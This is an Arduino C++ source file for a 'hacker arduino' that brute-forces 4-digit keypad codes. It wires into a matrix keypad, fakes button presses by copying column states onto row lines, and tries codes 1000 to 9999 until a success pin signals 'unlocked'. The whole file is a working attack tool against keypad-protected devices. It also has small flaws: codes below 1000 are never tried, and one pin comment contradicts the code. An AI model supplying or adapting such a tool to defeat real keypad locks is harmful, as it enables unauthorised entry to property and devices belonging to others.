#include "BruteForceService.h"

BruteForceService::BruteForceService() {}

void BruteForceService::startBruteForce() {
    Serial.println("start bruteforce");
    setupPinForBruteforce();

    int i = 1000;
    while (!digitalRead(SUCCESS_PIN) && i < 10000) {
        Serial.println(i);
        send4DigitCode(i);
        sendTouch(10);
        i++;
    }
    if (digitalRead(SUCCESS_PIN)) {
        Serial.println("unlocked");
    }
    //mainly for speakers, so we can reset keypad without to disconnect hacker arduino
    setupPinForNeutralAction();
}

void BruteForceService::setupPinForNeutralAction() {
    pinMode(LIN0, INPUT);
    pinMode(LIN1, INPUT);
    pinMode(LIN2, INPUT);
    pinMode(LIN3, INPUT);
}

void BruteForceService::setupPinForBruteforce() {

    pinMode(SUCCESS_PIN, INPUT_PULLUP);

    // INPUT_PULLUP instead of simple INPUT makes things a lot better! (no false number)
    pinMode(COL0, INPUT_PULLUP);
    pinMode(COL1, INPUT_PULLUP);
    pinMode(COL2, INPUT_PULLUP);
    pinMode(COL3, INPUT_PULLUP);

    pinMode(LIN0, OUTPUT);
    pinMode(LIN1, OUTPUT);
    pinMode(LIN2, OUTPUT);
    pinMode(LIN3, OUTPUT);
    digitalWrite(LIN0, HIGH);
    digitalWrite(LIN1, HIGH);
    digitalWrite(LIN2, HIGH);
    digitalWrite(LIN3, HIGH);

}


void BruteForceService::send4DigitCode(int code) {
    if (code >= 10)
        send4DigitCode(code / 10);

    int digit = code % 10;
    sendTouch(digit);
}

void BruteForceService::simulateButtonPress(int col,int line){
  //le principe est de copier l'état de la colonne contenant la touche 0 sur la ligne de la touche 0.
  //tant que la colonne de la touche est à l'état haut, on attends
  while (digitalRead(col)) {}
  //dès qu'elle passe à l'état bas, on fait passer la ligne de la touche à l'état bas
  digitalWrite(line,LOW);
  //tant que la colonne est toujours à l'état bas, on attends
  while (!digitalRead(col)) {}
  //dès qu'elle repasse à l'état haut, on repasse la ligne à l'état haut
  digitalWrite(line,HIGH);
}

void BruteForceService::sendTouch(byte touch) {
    delay(1);
    setupPinForBruteforce();
    switch (touch) {
        //press button 0
        case 0: //button 0 col1 lin1
        Serial.println("sending touch 0");
            simulateButtonPress(COL1,LIN0);
            break;
        case 1: //button 1
            simulateButtonPress(COL0,LIN1);
            break;
        case 2: //button 2
            simulateButtonPress(COL1,LIN1);
            break;
        case 3: //button 3
            simulateButtonPress(COL2,LIN1);
            break;
        case 4: //button 4
            simulateButtonPress(COL0,LIN2);
            break;
        case 5: //button 5
            simulateButtonPress(COL1,LIN2);
            break;
        case 6: //button 6
            simulateButtonPress(COL2,LIN2);
            break;
        case 7: //button 7
            simulateButtonPress(COL0,LIN3);
            break;
        case 8: //button 8
            simulateButtonPress(COL1,LIN3);
            break;
        case 9: //button 9
            simulateButtonPress(COL2,LIN3);
            break;
        case 10: //button *
            simulateButtonPress(COL0,LIN0);
            break;
        case 11: //button #
            simulateButtonPress(COL2,LIN0);
            break;
    }
    setupPinForNeutralAction();
}